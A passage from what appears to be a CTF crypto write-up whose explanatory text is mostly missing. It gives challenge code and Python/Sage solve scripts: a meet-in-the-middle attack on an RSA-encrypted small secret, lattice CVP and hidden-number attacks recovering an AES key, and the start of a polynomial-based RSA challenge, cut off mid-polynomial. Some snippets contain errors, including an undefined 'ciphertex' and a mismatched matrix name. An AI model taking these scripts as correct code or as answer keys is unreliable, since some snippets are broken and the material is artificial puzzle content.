class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ck = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">ck = 8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong></strong>361820</p><p><a href="https://tangcuxiaojikuai.xyz/post/601c0957.html">https://tangcuxiaojikuai.xyz/post/601c0957.html</a><strong>NCTF2021-rsa</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">n = <span class="number">26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ck = <span class="number">8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line">S = &#123;<span class="built_in">pow</span>(i,-e,n):i <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">20</span>))&#125;</span><br><span class="line">inv_ck = inverse(ck,n)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    s = inv_ck*(<span class="built_in">pow</span>(j,e,n))%n</span><br><span class="line">    <span class="keyword">if</span>(s <span class="keyword">in</span> S):</span><br><span class="line">        secret = S[s]*j</span><br><span class="line">        flag = <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="baby_lattice"><a class="markdownIt-Anchor" href="#baby_lattice"></a> baby_lattice</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">miku = <span class="number">30</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">key = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> key&gt; p:</span><br><span class="line">    key= getPrime(<span class="number">512</span>)</span><br><span class="line">ts = []</span><br><span class="line">gs = []</span><br><span class="line">zs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(miku):</span><br><span class="line">    t = getPrime(<span class="number">512</span>)</span><br><span class="line">    z = getPrime(<span class="number">400</span>)</span><br><span class="line">    g= (t * key + z) % p</span><br><span class="line">    ts.append(t)</span><br><span class="line">    gs.append(g)</span><br><span class="line">    zs.append(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ts = <span class="subst">&#123;ts&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gs = <span class="subst">&#123;gs&#125;</span>&#x27;</span>)</span><br><span class="line">iv= os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">ciphertext=cipher.encrypt(pad(flag.encode(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;iv=<span class="subst">&#123;iv&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ciphertext=<span class="subst">&#123;ciphertext&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong></strong><strong>CVP</strong><a href="https://tangcuxiaojikuai.xyz/post/6a2afd81.html">https://tangcuxiaojikuai.xyz/post/6a2afd81.html</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">13401991645840298882794100147034379521242237285821020793208518466205688272722127694554243298223159648613332253774886696888511245155898681828972316158766813</span></span><br><span class="line">ts = [<span class="number">8016983781273189754281912962247057409930227455812224730112055674262101679986538896353333785641031178561641562965339977035588567181180100475283408488320671</span>, <span class="number">12980173980684618239567238092970002844391225790428809984588444288874980047043175328056782109973890659670718383856150425014293022930574469326618263083648099</span>, <span class="number">8109856702010014482292978050018141635784057812487351143916154508689142112615449144377702002382005662470835964315028619291602564624893518861557701327890923</span>, <span class="number">12785373226115694299429762427866573289359143336748874789256870948157808484043436344897926547699412946084053665605873366419653263394817308889578649556482317</span>, <span class="number">12293720016807713691819354075258380849321736691923473670291035750221768289875347194928451102365603432383881559318603460687890903510706219895796459019974867</span>, <span class="number">9784378896444105030039569921777285228994264456281120536753266782980679466146906618674672118057906497814953677764528302638725540882074537262487534252076829</span>, <span class="number">9241433814815706758885649801540944918822400007457713603674159882791199750057709773097552334465041959969676782253637817171507122904345522225398825682237481</span>, <span class="number">11204803848333722110323297716136514262820561394355433234423667799557561253910421337700868735544193790444406938869863716247161888020220901893711513603634809</span>, <span class="number">10851090251796215969502640347727949807230163009657915435491546953253351810608099195268759626721620529756828379004467476267712531905975334082089231769707617</span>, <span class="number">11250957460128461102060212243723539805901629603092001540925013383541943835129096257407578679799378517176957440298695788786794500447140718667332595080944869</span>, <span class="number">12248623923069220370917375593286718711586079377902376988707257328512455851210970182518826733646869485671374318338949112466814956514662420760908691130244383</span>, <span class="number">11061068271412202445428992286301637014530049371871820612053163253748795430394720967354122057185625710764847486790478210908967065668096047462000900877243843</span>, <span class="number">9250800791153158078642768324800520716511537203538708124830844957330029236789799844775267058446261708862442981956837389747149720449997356553753692631237873</span>, <span class="number">11442112467994330302413453979716258058149104607244851803491048585747359474970005873336772224480265499136742622823880716879860377641238675210553131052206691</span>, <span class="number">8851268226889934481971979527547782930762103134830344221114784617526682434893736517219781937490279514229768881864475696389373739501629994242420024622585309</span>, <span class="number">8761826274329402585517262093482651333161640060627583337505498299736119877176278155436111156185319629046980645810012652601825582701466570339570478108791887</span>, <span class="number">8173260008522260126563915135008278248111293487661172115633899079869720932758788675224579864948752039769531398938248083971071345978173279466336354696742377</span>, <span class="number">11733325877716881936637372036969125985631514189799569847189115606745019694984456424617859168884541552882900918661071180298079869943357668081866511603361429</span>, <span class="number">12798678249651545625305346509566263707129030745621625744465668772298872710674031103310015594375483838020916596533864897632924958154707810583510669376046159</span>, <span class="number">11972367565183102195894957634073708898746516169055154830786380821612631063771935949099855541345280195465211676841845799521135332692746439801114025346776451</span>, <span class="number">8309485355838062558333744941897142201736283502970173073711189070760311131678107029730686549988329677109870570827466668034034377094834508445549924223585219</span>, <span class="number">10037957030668927878463105058548635761147918169468443696251870837018029994579358415317101911755591591785037623566701920710453008930531891302329922308475079</span>, <span class="number">13221078857886779075714191159549244640144219704164657103905516889650093241197471185563906205007376146027157620524696025494715411571586859030421582641250071</span>, <span class="number">13377141034964464295846379646837504968557246139611266461228568513844912255762222441387410898249170108735540582627742796017922462329606088337301365183628591</span>, <span class="number">11503417590216916228951909788782481610038959664264972733435373475346403291387209063270057139621628854733942831548624992555175497319058962145185736395531609</span>, <span class="number">10682562966818807073688884352394574841623385668134186058213080078637580526582062737913378756835873195913042020318042792997704842570481165538229628253983417</span>, <span class="number">7009494733984067792833862756223517770477471938386639921019003601598472840183655333614008677846799784155444425042016748876974547683111073376705004070094301</span>, <span class="number">9396274922380984183217450286560296708001013262936289587249206096013034374236192395477584831821730898646879768741299571262843654547918064041618890696711333</span>, <span class="number">9055143657462834722016836241561857041386247088507191351272758917384350750091500866289528933248085632291073921554368989805281660196853938630560350667255913</span>, <span class="number">7075881589550115729079726581415060529537262743216265811601339312252250745864621882784185460812341989475906020671174894015501378625757286896275136526488817</span>]</span><br><span class="line">gs = [<span class="number">3547025130757031371763547817278671805806523773597386380426228204353325314755125874825372064344551510783942287325061869515563511720377069479838665918916338</span>, <span class="number">561524185998066303459395863084068415723518371857539287162474295289737845979144864495515229777991463363132381517905379393086271602757286846999926034367409</span>, <span class="number">10630918988200018501478600883655233518093875635494077893436132190015060760951001030031068630865667129447250982542911493607849695255758299063471724885107320</span>, <span class="number">5385738167688714294394456876987750423263279740302210790063861475593679005286633965917637168163655774852001750955925563171806165861440634515967640179944804</span>, <span class="number">3686451063569312252337028014973428925521749963152262622523483348285262144703447272544972123815729823760936936761643322992469583780002855185407873398768127</span>, <span class="number">9596580956215126253893458055745193704575088913515678341231900675542245449333964660007025564677263334281046226112471415925784249910282102204627251580303047</span>, <span class="number">9656829597739031272294632966205884640125918053307645634673206826103547310810254891833432384622548154588598670746803614688469837172848481449498079690935715</span>, <span class="number">9907308304392368929600091658386459655450451232070442677496713774343506026327224070703486188335961098033888098971263207077722473044862118000082007110037557</span>, <span class="number">7839372385123283975949639433665292734490760458360682832497005213559939527031767909811695257768341209806346811519315554587887588294359891829457980910373676</span>, <span class="number">9524560447616291402016995361580593070951296833074538783490159546001656765257005901587161833656370873513309819850104060230660386406669378214335512722509152</span>, <span class="number">8734422874517209772760818316188000967216535009508164549745674472106165337990045713973843427581730460676070294620298664038968581128044873585552989614725336</span>, <span class="number">5148158222052082942951739997892280954937954769195857112271289335776175568625514426629773392655353554820374445881301175856523121361252868192790918069469104</span>, <span class="number">3405639365216597742633558534342314393231966921971024333387009357007031255109911181571542920889177048552084631482291912851876735480121959418518626599223928</span>, <span class="number">6965895908963098896413697893751255263053889382630643791713636829201586125658579731479485123904224727756791164618191156426250811133029277086293720268527300</span>, <span class="number">515472047175628755463279789359658211455570096067652817360508027869002916852457796014115363850477155232728049656195126940493402028508630979737222916876246</span>, <span class="number">8377848726362282033165443045774756072489017398005262818165334796393061408947900148462399707261050565348807577258621241416711089587307194346694505937252864</span>, <span class="number">1178755053483981880338850194698011124968424379914871101461970724324613752209283539401502897388962321646518511682063263530792638817282211333222820982688221</span>, <span class="number">6409725586399153562174435158247599193499008381130383743433623949976530392240171542527657077771723107664747118903213393154893390715457247849808357209465942</span>, <span class="number">3372824803484968486680937546271819996332625362891283809637871759604598252172343794474197823370030403360262989580844260103083478034905726890611202238641340</span>, <span class="number">13221067729455004299677399984872603663881675510140157358091630484387026309376774076498558628883879446483977202290444900329681753187886973457338777404374837</span>, <span class="number">7168388056726802823482632673894477305062116631923141017136239676696007696629606782541016490173953868270727600022309320772114799519383514048456314407549126</span>, <span class="number">5250230933448962245502125593869313477032913928941516938273943408457441209365441112912617832856547549404891414953525445963675011329667621804152746371657313</span>, <span class="number">8511291855606246692070730459514263912089592580342504124890734122750181111943376656479213361961009582891618556261302703133404839204999651359329176948170842</span>, <span class="number">10576966024912004586600985705328475294820172279541596349092328002861342696932964481093301707680584309062968518297314914578723605267596141569538103299931592</span>, <span class="number">12610576251820483830699440118009518195547953924641848179631259695652398482759919292823264035055444639679877606276670927735340951916197191958922906156370663</span>, <span class="number">3742260845065949575192054445757226288737527960324254459850715703182879384214273141678432129201712761002566924178045796602250837169613100836509080462118064</span>, <span class="number">11563799338655584285772430060426469486983276581413105960901201146319641194721216394735314795999096052047566733050321685673448559752053334666493545565267458</span>, <span class="number">2135904971793751083168704063674429207856744601756475004904460101727999030934815461118290836502605293753384609825541213034656253854812143724421464450937515</span>, <span class="number">3115138049292154301818359336614981367419382594686950083225042221335435796679806070685800479754927915293066789893346628151325862299622031407323031470432866</span>, <span class="number">11834987428374239733081967249175125232293539826462896997963240557834259212701171232384194311849363016441847536816726226234955703291712817155658535826680986</span>]</span><br><span class="line">iv = <span class="string">b&#x27;\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8&#x27;</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&amp;8%,M&#x27;</span></span><br><span class="line">rs = ts</span><br><span class="line">cs = gs</span><br><span class="line"></span><br><span class="line">G=GF(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">  small = target</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">      c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">      small -= M[i] * c</span><br><span class="line">  <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">A = matrix(ZZ, m+n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = p</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[m , x] = rs[x]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, cs)</span><br><span class="line">res = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line">R = IntegerModRing(p)</span><br><span class="line">M = Matrix(R, rs)</span><br><span class="line">res=vector(R, res)</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(cs,res):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i-j))-<span class="number">2</span>==<span class="number">400</span></span><br><span class="line">key=((res[<span class="number">0</span>])*inverse(rs[<span class="number">0</span>],p)) %p</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">flag = cipher.decrypt(ciphertex)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>HNP</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">M = Matrix(ZZ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^(<span class="number">512</span>-<span class="number">400</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p * k</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i] * k</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i] * k</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">2</span>^<span class="number">512</span></span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == <span class="number">2</span>^<span class="number">512</span>:</span><br><span class="line">        <span class="built_in">print</span>(i[-<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p><code>wp</code>()<strong>p-key</strong><a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">wp</a><br /><img src="https://pic1.zhimg.com/80/v2-e74d7d58b38938f539b9cf92783a11cf_1440w.png" alt="" /><br />(???)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">L = Matrix(QQ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^<span class="number">400</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i]</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i]</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = k/p</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = k</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == k:</span><br><span class="line">        key = p-(<span class="built_in">abs</span>(i[-<span class="number">2</span>].numerator())/k)</span><br></pre></td></tr></table></figure><h2 id="ez_fermat_bag_pro"><a class="markdownIt-Anchor" href="#ez_fermat_bag_pro"></a> EZ_Fermat_bag_Pro</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">88</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">f = P(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p,q),n)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">str</span>(p)))) <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>:])</span><br><span class="line">c = bytes_to_long(flag) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line"><span class="string">f = x^31 - x^30*y - 2*x^29*y^2 + 7*x^28*y^3 + 2*x^27*y^4 - 4*x^24*y^7 + 3*x^23*y^8 - x^20*y^11 - 4*x^19*y^12 + x^18*y^13 - 5*x^17*y^14 - 4*x^16*y^15 - x^15*y^16 + x^14*y^17 + x^13*y^18 + x^12*y^19 - 2*x^11*y^20 - 3*x^9*y^22 + 5*x^7*y^24 + x^6*y^25 + 6*x^4*y^27 + x^3*y^28 + 2*x*y^30 + y^31 - 2*x^30 - 3*x^29*y + 2*x^28*y^2 + 2*x^27*y^3 - x^26*y^4 - x^25*y^5 - 2*x^24*y^6 - 3*x^23*y^7 - 3*x^22*y^8 - 3*x^20*y^10 - 4*x^19*y^11 + 2*x^18*y^12 + x^15*y^15 - x^14*y^16 - 2*x^12*y^18 - 3*x^11*y^19 - x^10*y^20 + x^9*y^21 + 2*x^8*y^22 + x^7*y^23 + x^5*y^25 - x^4*y^26 - 2*x^3*y^27 - 2*x^2*y^28 - y^30 - 2*x^29 - x^28*y + 3*x^26*y^3 - x^25*y^4 - 2*x^24*y^5 + x^23*y^6 - x^22*y^7 - x^20*y^9 + 2*x^19*y^10 + 2*x^18*y^11 + x^16*y^13 + x^15*y^14 + x^14*y^15 + x^13*y^16 + x^12*y^17 + 5*x^11*y^18 - x^9*y^20 - 2*x^8*y^21 - 5*x^7*y^22 - 2*x^6*y^23 + 3*x^5*y^24 - 5*x^3*y^26 - x^2*y^27 + 2*x*y^28 - y^29 + 3*x^28 + 3*x^27*y - 2*x^26*y^2 + x^25*y^3 + 2*x^24*y^4 - x^23*y^5 - 2*x^22*y^6 - 3*x^20*y^8 - 3*x^19*y^9 + 4*x^17*y^11 - x^16*y^12 - 3*x^15*y^13 - 2*x^14*y^14 + x^13*y^15 + 2*x^12*y^16 - 2*x^11*y^17 + x^10*y^18 - 2*x^9*y^19 + x^8*y^20 - 2*x^7*y^21 - x^6*y^22 + x^5*y^23 - x^4*y^24 + x^3*y^25 + x^2*y^26 - x*y^27 - y^28 + x^27 + x^26*y - 2*x^24*y^3 + x^23*y^4 - 3*x^22*y^5 - 2*x^21*y^6 - 2*x^20*y^7 - 5*x^19*y^8 + 2*x^18*y^9 - 5*x^17*y^10 + x^16*y^11 - 3*x^15*y^12 - 4*x^14*y^13 - x^13*y^14 + x^12*y^15 + 3*x^11*y^16 + 2*x^10*y^17 - 4*x^9*y^18 - 2*x^6*y^21 + x^5*y^22 + 4*x^3*y^24 + 2*x^2*y^25 + 2*x*y^26 - 2*y^27 + x^25*y + x^24*y^2 + x^23*y^3 + 5*x^22*y^4 + x^20*y^6 - 3*x^19*y^7 + x^18*y^8 - x^17*y^9 + 2*x^15*y^11 - x^14*y^12 + 2*x^13*y^13 - x^12*y^14 + 4*x^11*y^15 - x^10*y^16 - 2*x^6*y^20 - x^5*y^21 + 3*x^3*y^23 + x^2*y^24 - 3*x*y^25 - 3*y^26 + 3*x^25 - 2*x^23*y^2 - x^21*y^4 + x^17*y^8 + 2*x^16*y^9 - x^15*y^10 - 2*x^14*y^11 - x^13*y^12 + 2*x^12*y^13 - 2*x^11*y^14 - x^9*y^16 - x^8*y^17 - x^6*y^19 - x^5*y^20 + x^4*y^21 + x^3*y^22 + 5*x*y^24 - 2*y^25 - x^24 + 2*x^23*y + x^22*y^2 - x^21*y^3 - x^19*y^5 + x^18*y^6 - x^17*y^7 + 2*x^16*y^8 - 4*x^15*y^9 - x^14*y^10 - x^13*y^11 - x^12*y^12 + 4*x^10*y^14 + 2*x^9*y^15 - x^8*y^16 - 2*x^7*y^17 - 2*x^6*y^18 + 4*x^5*y^19 + x^4*y^20 + 2*x^2*y^22 - 5*x*y^23 - y^24 + x^23 - x^22*y + 2*x^21*y^2 - x^20*y^3 - x^18*y^5 - x^17*y^6 - 5*x^15*y^8 + x^14*y^9 - 3*x^13*y^10 + 3*x^12*y^11 + 2*x^11*y^12 - 2*x^10*y^13 - 2*x^9*y^14 - x^8*y^15 + 2*x^7*y^16 - 2*x^6*y^17 - 4*x^5*y^18 - 5*x^3*y^20 - x^2*y^21 - x*y^22 - 4*y^23 - x^22 + 2*x^21*y - 2*x^20*y^2 - 2*x^19*y^3 - 3*x^17*y^5 - x^16*y^6 - x^15*y^7 + 4*x^13*y^9 + 2*x^12*y^10 + 3*x^11*y^11 + 2*x^10*y^12 - x^9*y^13 - x^7*y^15 + 2*x^6*y^16 + x^3*y^19 + 2*x^2*y^20 + 2*x*y^21 + 3*y^22 - 3*x^21 - x^20*y - x^19*y^2 + 2*x^17*y^4 - x^16*y^5 - x^15*y^6 + x^14*y^7 - 5*x^12*y^9 - 2*x^11*y^10 + x^10*y^11 + x^6*y^15 + x^5*y^16 + x^4*y^17 - 3*x^2*y^19 - 2*x*y^20 - 2*y^21 + x^20 + 2*x^19*y - 2*x^17*y^3 + 2*x^16*y^4 - 3*x^15*y^5 + 4*x^14*y^6 + 2*x^13*y^7 - x^12*y^8 - 2*x^11*y^9 + x^10*y^10 + 6*x^9*y^11 + x^8*y^12 + x^7*y^13 + 2*x^5*y^15 + 4*x^4*y^16 + x^3*y^17 - x^2*y^18 + 3*x*y^19 - x^17*y^2 + 2*x^16*y^3 + 3*x^14*y^5 - x^13*y^6 + 2*x^11*y^8 + x^10*y^9 + 3*x^9*y^10 - x^7*y^12 - x^6*y^13 + 3*x^5*y^14 - 4*x^4*y^15 + x^2*y^17 + 2*y^19 - x^18 - x^16*y^2 - 2*x^14*y^4 - 2*x^13*y^5 - 2*x^12*y^6 + 2*x^11*y^7 + 3*x^9*y^9 + 3*x^8*y^10 + x^6*y^12 - x^4*y^14 + 2*x^3*y^15 + 2*x^2*y^16 - 2*x*y^17 - x^17 - 4*x^16*y - 2*x^15*y^2 + 2*x^14*y^3 - x^13*y^4 + x^12*y^5 - 2*x^11*y^6 - 3*x^10*y^7 - x^9*y^8 - 5*x^8*y^9 + 2*x^7*y^10 + 2*x^6*y^11 - x^5*y^12 + x^4*y^13 - 3*x^2*y^15 + x*y^16 - 3*x^16 + x^15*y - 3*x^14*y^2 - x^13*y^3 - x^12*y^4 + 2*x^11*y^5 - x^10*y^6 + 5*x^8*y^8 + 3*x^7*y^9 + 3*x^6*y^10 + 2*x^5*y^11 + 4*x^4*y^12 + 2*x^3*y^13 + x^2*y^14 - 3*x*y^15 - x^15 + 3*x^14*y + x^13*y^2 - x^12*y^3 - 3*x^11*y^4 + x^10*y^5 - x^9*y^6 + 2*x^8*y^7 - x^7*y^8 + 4*x^5*y^10 - 2*x^4*y^11 + x^3*y^12 - x^14 + x^13*y + 2*x^12*y^2 + x^11*y^3 - 5*x^10*y^4 - x^9*y^5 - 3*x^8*y^6 - 2*x^7*y^7 + x^6*y^8 + 3*x^5*y^9 + x^4*y^10 + 2*x^3*y^11 - x^2*y^12 - 4*x*y^13 + 3*y^14 + x^12*y - 2*x^11*y^2 - x^9*y^4 - x^8*y^5 + 5*x^7*y^6 - 4*x^6*y^7 + 3*x^5*y^8 + 4*x^4*y^9 - 3*x^3*y^10 - x^2*y^11 - 2*x*y^12 - 3*y^13 + 3*x^12 + x^11*y + x^10*y^2 + x^9*y^3 + x^8*y^4 - x^6*y^6 - x^5*y^7 - 4*x^3*y^9 - x^2*y^10 - 3*x*y^11 - 2*y^12 + x^10*y + 5*x^9*y^2 + x^8*y^3 + 3*x^5*y^6 + x^4*y^7 + 2*x^3*y^8 - 4*x^2*y^9 + 2*x*y^10 + 3*y^11 - x^10 - 2*x^9*y - 2*x^7*y^3 - x^6*y^4 + x^5*y^5 + 3*x^4*y^6 - 2*x^2*y^8 - x*y^9 + 4*x^9 - 3*x^8*y - 3*x^6*y^3 + x^5*y^4 - x^4*y^5 - 2*x^3*y^6 - 2*x^2*y^7 + x*y^8 + 4*y^9 + 2*x^8 - x^7*y - 2*x^5*y^3 - 4*x^4*y^4 + 3*x^3*y^5 + 4*x^2*y^6 + 2*x*y^7 - 2*y^8 + 2*x^7 + 3*x^5*y^2 + 3*x^2*y^5 - x*y^6 - 4*x^6 + 6*x^3*y^3 + 2*x^2*y^4 - 2*x*y^5 - 